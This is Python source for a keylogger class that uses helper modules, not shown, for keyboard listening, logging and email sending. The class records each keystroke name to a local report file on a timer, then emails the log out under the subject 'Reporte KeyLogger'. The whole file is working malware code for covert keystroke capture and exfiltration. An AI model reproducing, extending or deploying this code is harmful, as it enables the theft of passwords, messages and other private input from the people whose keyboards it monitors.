import os
from threading import Timer
from time import sleep

from dotenv import load_dotenv
from LoggerInfo import LoggerInfo as Info
from KeyBoarListener import KeyBoardListener as Listener
from SenderEmail import SenderEmail as Email

load_dotenv()


class KeyLogger:
    def __init__(self):
        self.__interval = os.getenv("INTERVAL")
        self.__report_local = Info(path=os.getenv("REPORT_PATH"))
        self.__observador = Listener()
        self.__sender = Email('Reporte KeyLogger')

    @property
    def sender(self):
        return self.__sender

    @property
    def interval(self):
        return self.__interval

    @property
    def report_local(self):
        return self.__report_local

    @property
    def observador(self):
        return self.__observador

    def add_text(self, event):
        print(event.name)
        self.report_local.info.info(event.name)

    def report_interval(self):
        self.observador.ejecutar_funcion_callback(self.add_text)
        timer = Timer(float(self.interval), self.report_interval)
        timer.daemon = True
        timer.start()

    def start(self):
        self.report_local.ruta = f'{os.getenv("LOCAL_LOG_REPORT")}'
        self.report_local.config()
        self.report_local.init()
        self.report_interval()
        sleep(int(os.getenv('INTERVAL')))
        self.report_local.finish()
        sleep(5)
        mensaje = self.sender.construir_mensaje_email(self.report_local.filename)
        print(mensaje)
        self.sender.enviar_email(mensaje)


if __name__ == '__main__':
    key = KeyLogger()
    key.start()

